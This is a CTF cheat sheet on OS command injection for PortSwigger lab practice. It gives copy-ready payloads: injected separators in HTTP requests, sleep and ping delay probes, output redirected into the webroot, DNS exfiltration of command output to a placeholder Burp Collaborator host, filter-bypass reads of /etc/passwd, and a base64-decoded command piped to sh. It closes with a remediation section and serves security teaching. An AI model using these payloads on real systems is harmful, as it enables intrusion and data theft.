# OS Command Injection — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Collaborator  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

OS Command Injection occurs when an application passes user-supplied input into a system shell (`sh`, `bash`, `cmd.exe`) without adequate input sanitization.

1. **Locate Shell Invocation Candidates:** Look for functionality that executes system tools:
   - Network diagnostics (ping, traceroute, nslookup)
   - File format converters / image manipulators (ImageMagick, ffmpeg)
   - PDF/report generators, email dispatchers (`sendmail`)
   - Backup or archive utilities (`tar`, `zip`)
2. **Test Command Separators:** Try injecting separators to break the command stream:
   - `;`, `&`, `&&`, `|`, `||`, Newline (`%0a` or `\n`), Backticks (`` `cmd` ``), `$()`
3. **Determine Output Channel:**
   - **In-Band:** Command standard output is reflected directly in the HTTP response.
   - **Blind (Time-Based):** Output is suppressed; verify execution using `sleep` or `ping`.
   - **Blind (File Redirection):** Redirect command output to a writable public web directory (`/var/www/images/`).
   - **Blind (Out-of-Band / OAST):** Trigger DNS or HTTP queries to Burp Collaborator containing exfiltrated data.

---

## 2. Command Separators & Syntax

### Separator Behavior

| Separator | Windows | Linux | Behavior |
|---|---|---|---|
| `;` | No | Yes | Executes sequentially regardless of success |
| `&` | Yes | Yes | Runs first command in background, executes second |
| `&&` | Yes | Yes | Executes second command only if first succeeds |
| `\|` | Yes | Yes | Pipes output of first command to second |
| `\|\|` | Yes | Yes | Executes second command only if first fails |
| `%0a` / `\n` | Yes | Yes | Newline command separator |
| `$(...)` | No | Yes | Command substitution |
| `` `...` `` | No | Yes | Command substitution |

---

## 3. In-Band Command Injection

When command output is rendered directly in the response:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1|whoami
```
*Try trailing separators if arguments follow:* `1|whoami||` or `1;whoami;`

---

## 4. Blind Command Injection Techniques

### 1. Blind with Time Delays (Verification)
When the application performs the operation asynchronously or suppresses output:

```http
POST /feedback/submit HTTP/2
Content-Type: application/x-www-form-urlencoded

name=Peter&email=test@test.com||sleep+10||&message=Hello
```
*Windows delay probe:*
```text
email=test@test.com||ping+-n+10+127.0.0.1||
```
*Interpret Response:* If the request takes ~10 seconds to return, remote execution is confirmed.

---

### 2. Blind with Output Redirection
When timing confirms execution, redirect command output to a readable web directory:

**Step 1: Write output to a publicly accessible directory:**
```http
POST /feedback/submit HTTP/2
Content-Type: application/x-www-form-urlencoded

email=test@test.com||whoami>/var/www/images/output.txt||
```

**Step 2: Read the output file:**
```http
GET /image?filename=output.txt HTTP/2
```

---

### 3. Blind with Out-of-Band (OAST) Interaction
When the filesystem is read-only or web paths are unknown, force an external DNS query:

```http
POST /feedback/submit HTTP/2
Content-Type: application/x-www-form-urlencoded

email=test@test.com||nslookup+BURP-COLLABORATOR-SUBDOMAIN||
```
*Windows probe:* `& nslookup BURP-COLLABORATOR-SUBDOMAIN &`

---

### 4. Blind Out-of-Band Data Exfiltration
Prepend command output to the Burp Collaborator hostname:

```http
POST /feedback/submit HTTP/2
Content-Type: application/x-www-form-urlencoded

email=test@test.com||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
*Alternative substitution syntax:*
```text
email=test@test.com||nslookup+$(whoami).BURP-COLLABORATOR-SUBDOMAIN||
```
*Check Collaborator:* Look for DNS queries matching: `root.BURP-COLLABORATOR-SUBDOMAIN`.

---

## 5. Filter & WAF Bypasses

### 1. Bypassing Space Restrictions

| Bypass Technique | Linux Syntax |
|---|---|
| **Internal Field Separator (IFS)** | `cat$IFS/etc/passwd` or `cat$IFS$9/etc/passwd` |
| **Brace Expansion** | `{cat,/etc/passwd}` |
| **Input Redirection** | `cat</etc/passwd` |
| **Environment Variable Slice** | `${PATH:0:1}` *(Evaluates to `/`)* |

---

### 2. Bypassing Blacklisted Commands (`cat`, `whoami`, `id`)

```bash
# String concatenation
c'a't /et'c'/pas's'wd
c"a"t /et"c"/pas"s"wd

# Wildcard execution
/bin/c?t /etc/pass*
/bin/n*lookup $(who*mi).BURP-COLLAB

# Uninitialized shell variables
c$@at /etc/passwd

# Base64 decode execution
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
```

---

## 6. CTF Quick Reference

| Scenario | Objective | Payload Example |
|---|---|---|
| **Direct Reflection** | In-band command execution | `PARAM=1 \| whoami` |
| **Blind Detection** | Prove RCE via delay | `PARAM=test \|\| sleep 10 \|\|` |
| **Blind Read (File)** | Exfiltrate to webroot | `PARAM=test \|\| id > /var/www/images/id.txt \|\|` |
| **Blind OAST** | DNS confirmation | `PARAM=test \|\| nslookup BURP-COLLAB \|\|` |
| **Blind Exfiltration**| Exfiltrate output via DNS | `PARAM=test \|\| nslookup $(whoami).BURP-COLLAB \|\|` |
| **Space Filter** | Execute with no spaces | `cat$IFS/etc/passwd` |

---

## 7. Remediation

- **Never pass raw user input to system shells:** Avoid functions like PHP `system()`, `exec()`, `passthru()`, Python `os.system()`, Node.js `child_process.exec()`.
- **Use Parameterized System APIs:** Pass arguments as discrete arrays rather than raw strings to prevent shell interpretation:
  ```python
  # Safe: invokes binary directly without a shell
  import subprocess
  subprocess.run(["/usr/bin/ping", "-c", "4", target_host], shell=False)
  ```
- **Input Validation:** Enforce strict allowlists (e.g. only alphanumeric characters and IP addresses via regex).
